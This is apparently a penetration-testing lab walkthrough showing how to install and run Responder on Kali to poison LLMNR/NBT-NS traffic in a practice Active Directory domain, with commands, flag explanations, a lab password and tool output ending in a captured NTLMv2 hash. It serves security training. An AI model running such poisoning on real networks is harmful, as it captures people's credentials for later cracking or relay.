### Installing responder
- Log into your Kali machine as the root user, and install responder.

```
sudo apt autoremove --purge responder -y && sudo apt autoclean
sudo rm -rf /usr/share/responder/
sudo apt install responder -y
```

### Using responder

```
sudo responder --help
sudo responder -I eth0 -dPv
```

- The `-d` flag stands for DHCP and using it enables the tool to answer basic DHCP broadcast requests.
- The `-w` flag enables the tool to start a WPAD rogue proxy server, this allows a browser to automatically discover proxies without needing further configuration.
	- Clients are able to locate the URL configuration file using DHCP or DNS discovery methods, and this will allow us to capture some hashes as well.
- The `-P` flag forces authentication for the proxy, if we are using it. WPAD doesn't need to be on for this to work.
- The `-v` flag enables verbose mode.

### Tool execution
- We want to make sure that most servers are on, crucially HTTP and SMB at the least.
- We also want to make sure that the Responder IP matches our attack machine's IP, and that the NIC set is correct

### Simulating network traffic
- Next to generate some network traffic, we can log into THEPUNISHER machine as `fcastle`, with the password `Password1`.
- Now we will navigate to the attacker machine's IP using Explorer on the machine we are logged in on (fcastle/MARVEL at THEPUNISHER), an authentication prompt might show up, which we need to provide the credentials to as the victim.
- We should now start seeing the hashes showing up on the attacker machine, along with the username, domain and client IP address of the victim.

```
┌──(root㉿kali)-[/home/kali]
└─# responder -I eth0 -dPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.2.4]
    Responder IPv6             [fe80::a00:27ff:fe86:d78b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-0VWSL4K8PAB]
    Responder Domain Name      [JV20.LOCAL]
    Responder DCE-RPC Port     [46930]

[+] Listening for events...                                                                     

[HTTP] Sending NTLM authentication request to 10.0.2.17
[HTTP] GET request from: ::ffff:10.0.2.17  URL: / 
[HTTP] NTLMv2 Client   : 10.0.2.17
[HTTP] NTLMv2 Username : MARVEL\fcastle
[HTTP] NTLMv2 Hash     : fcastle::MARVEL:08eff6a93a9268ca:2C2ACDA2A473B4F77847999951C4B3E1:0101000000000000BD3820DAD4D0DB014D84BBC16E64999100000000020008004A0056003200300001001E00570049004E002D0030005600570053004C0034004B003800500041004200040014004A005600320030002E004C004F00430041004C0003003400570049004E002D0030005600570053004C0034004B0038005000410042002E004A005600320030002E004C004F00430041004C00050014004A005600320030002E004C004F00430041004C00080030003000000000000000010000000010000061EF1E8B2372D90F3F437485A86E03E66872CE670C4D58D57929272696C414410A0010000000000000000000000000000000000009001A0048005400540050002F00310030002E0030002E0032002E0034000000000000000000
```